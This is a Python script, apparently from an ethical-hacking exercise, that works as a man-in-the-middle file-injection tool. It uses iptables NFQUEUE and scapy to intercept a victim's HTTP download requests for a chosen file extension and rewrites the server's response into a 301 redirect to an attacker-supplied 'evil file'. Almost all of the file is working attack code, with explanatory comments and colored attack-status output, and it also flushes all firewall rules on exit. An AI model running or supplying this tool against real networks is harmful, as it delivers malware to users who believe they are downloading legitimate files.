#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from functools import partial
import netfilterqueue
import scapy.all as scapy
from colorama import init, Fore
from halo import Halo


# First we need to know well what we are doing,
# We have our arp_spoof so,
# we can capture the traffic between the victim and the gateway.
# We now need to intercept these packets and modify them first before it arrives its destination.
# scapy help us to :
# 1. create packets
# 2. analyze packets
# 3. send/receive packets
# but not INTERCEPT packets
# Our main goal is to capture the packet, modify it, transmit our modified version .
# To achieve that we need to make a trap that will delay the real version of the packet,
# so our modified version will be sent and processed first.
# To create that trap we need to create a queue and trap in it the original packets.
# So we will use a tool called iptables to modify the routing rules.


def create_forward_chain_rule(interface):
    create_rule = ["sudo", "iptables", "-I", "FORWARD", "-i",
                   interface, "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(create_rule)


""""
The  command inserts a rule into the FORWARD chain of the firewall configuration
and specifically applies it to the given interface. Let's break down the command and its implications:

1. iptables: The command-line tool used for configuring the netfilter firewall rules in the Linux kernel.

2.-I: Indicates that we want to insert a new rule into the chain.

3. FORWARD: Specifies the name of the chain where the rule will be inserted. In this case,
 it is the FORWARD chain responsible for forwarding packets between different network interfaces.

4. -i : Specifies the input interface to which the rule will apply.

5. -j NFQUEUE: Specifies the target of the rule. It sets the target to NFQUEUE,
indicating that packets matching this rule will be sent to a userspace queue for further processing.

6. --queue-num 0: Specifies the queue number to which the packets will be sent.
In this case, the queue number is set to 0.

With this command, any packets that are forwarded through the FORWARD chain and match
the input interface will be redirected to the specified userspace queue (0) for further
processing by a userspace program.

Note that this will only trap the coming traffic from other devices,
To make it trap the traffic on your device so you need to create rules
for the  OUTPUT and INPUT chains .
"""


# ---------------------------------------------------------------
#                    On The Local Machine
# ---------------------------------------------------------------
def create_input_chain_rule():
    command = ["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


def create_output_chain_rule():
    command = ["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


# ---------------------------------------------------------------


def delete_chain_rules():
    command = ["sudo", "iptables", "--flush"]
    subprocess.run(command)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = u"This tool Intercepts the HTTP Response, Replaces the requested file to be downloaded" \
                   u" with a given File/URL, Then Forward it to its destination after it is modified." \
                   u"\nDeveloped By (BigTrader) \u2620\ufe0f"

    parser.add_argument("-l", "--local", dest="local", action="store_true",
                        help="if you are testing on your local machine or when using [bettercap]")

    parser.add_argument("-i", "--interface", dest="interface",
                        help="The interface you want to use in the attack", required=True)

    parser.add_argument("-x", "--extension", dest="extension",
                        help="The extension of the file that you want to replace in the response",
                        required=True)

    parser.add_argument("--payload", dest="payload",
                        help="The payload you want to inject", required=True)

    parser.add_argument("--port", dest="port",
                        help="The port that you will listen and transmit packets through,"
                             " (8080) if you are using [bettercap]", required=True)

    arguments = parser.parse_args()

    return arguments


# Creating a global spinner object for showing the progress of our script:
spinner = Halo(text="Waiting For The Victim To Request The Targeted Downloading...", spinner='dots')
# Initialize colorama
init()


# This function will modify the load of the Raw Layer in a given packet
def set_load(packet, new_load):
    packet[scapy.Raw].load = new_load
    # An important thing that we shouldn't miss, That we have to also modify the [ IP ] & [ TCP ] Layers
    # And we are interested in two main fields
    # 1. len    : Specifies the total length of the packet, including both the header and the payload.
    # 2. chksum : The receiving end can calculate the checksum to verify the integrity of the packet.
    packet[scapy.IP].len = None
    packet[scapy.IP].chksum = None
    packet[scapy.TCP].chksum = None

    # Recalculate the length and checksum fields
    packet = packet.__class__(bytes(packet))

    return packet


# In this program we need to replace the file that the victim wants to download, with our evil file,
# So, As we are MITM ,to achieve that we will forward the HTTP request that the victim made,
# Then after receiving the response we will modify it (Raw Layer.load field) and send the modified version to the victim.
# This function will take the extension of the file that we want to replace it with ours

# Creating a list to store the TCP ack of each request:
Acks = []


def process_packet(extension, payload, port, packet):
    try:
        # To see what the packet is carrying :
        # We can't use the flexable scapy functions like show,summary, etc... as it is not a scapy packet
        # But we can use get_payload function to see contents of each packet.
        # print(packet.get_payload())
        # But this will be not clear, So we can convert this packet into a scapy packet so, We can deal with it :
        scapy_packet_payload = scapy.IP(packet.get_payload())
        # Filtering the packets to get those which have the Raw Layer
        if scapy_packet_payload.haslayer(scapy.Raw):
            # Storing the load of the Raw layer
            load = str(scapy_packet_payload[scapy.Raw].load)
            # So now we need to know if we captured an HTTP request or response
            # So if we found that the src port in the packet's TCP layer is equal to given "port" [ex:80 (http)] so,
            # It is a response else : It is a request.
            # Checking that the packet contains TCP Layer
            if scapy_packet_payload.haslayer(scapy.TCP):
                if scapy_packet_payload[scapy.TCP].dport == int(port):
                    # Here we will check if the request in the load contains a request for
                    # downloading the give extension
                    # We also should check that the request that we capture here is not our injected payload!
                    # Or we will get into an infinite loop of modifying the request.
                    if (str(extension).lower() in load.lower()) and (str(payload) not in load.lower()):
                        spinner.stop()
                        print(Fore.CYAN + "\n[+] ", "HTTP Request For: <", Fore.YELLOW + extension, ">")
                        # Now we have found the request, but we still don't know which is the response for this request
                        # So, we will use the "seq" and "ack" fields in the TCP Layer
                        # So, if the "ack" of the request is the same as the "seq" in the response,
                        # That means we h'v found the response
                        # for the request:
                        request_ack = str(scapy_packet_payload[scapy.TCP].ack)
                        # Appending the "ack" in the Acks list so, We can search in it when we catch every "seq"
                        Acks.append(request_ack)
                        spinner.start()

                elif scapy_packet_payload[scapy.TCP].sport == int(port):
                    response_seq = str(scapy_packet_payload[scapy.TCP].seq)
                    if response_seq in Acks:
                        spinner.stop()
                        print(Fore.CYAN + "[+] ", "Replacing The Captured <", Fore.YELLOW + extension, "> File",
                                                  "With <", Fore.RED + payload, ">")
                        # So, Lets create a fake load and replace the original one with it :
                        fake_load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + payload + "\r\n\r\n"
                        # This fake load will permanently redirect the victim to download our content
                        scapy_packet_payload = set_load(scapy_packet_payload, fake_load.encode())
                        # Finally we need to set this payload to the original packet
                        packet.set_payload(bytes(scapy_packet_payload))
                        print(Fore.YELLOW + u"\n[+] Redirection Done,The evil-file is injected \u2620\ufe0f \n")
                        spinner.start()
                        # Removing this ack from our list, Because we are now sure that we won't
                        # find another response for this request
                        Acks.remove(response_seq)
    except Exception as e:
        spinner.stop()
        print(Fore.RED + "\n[-] ", "An unexpected error occurred while processing the packet: ", str(e))
    finally:
        packet.accept()


# This function will give time to wait for the response as if we didn't wait,
# The finding process may be slower
def waiting_for_response(capture_duration, queue):
    start_time = time.time()
    # This line sets up a while loop that will continue running as long as
    # the elapsed time (current time minus the start time) is less than the capture_duration.
    while time.time() - start_time < capture_duration:
        queue.run()
        time.sleep(0.1)


def main():
    arguments = get_arguments()
    local = arguments.local
    extension = arguments.extension
    payload = arguments.payload
    interface = arguments.interface
    port = arguments.port

    if local:
        create_output_chain_rule()
        create_input_chain_rule()
    else:
        create_forward_chain_rule(interface)

    try:
        spinner.start()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, partial(process_packet, extension, payload, port))
        waiting_for_response(10, queue)
    except KeyboardInterrupt:
        spinner.stop()
        delete_chain_rules()
        print(Fore.RED + "\n[x] ", "Attack Stopped")
        sys.exit()

    except Exception as e:
        spinner.stop()
        delete_chain_rules()
        print(Fore.RED + "\n[-] ", f"An unexpected error occurred: {str(e)} ")


if __name__ == '__main__':
    main()
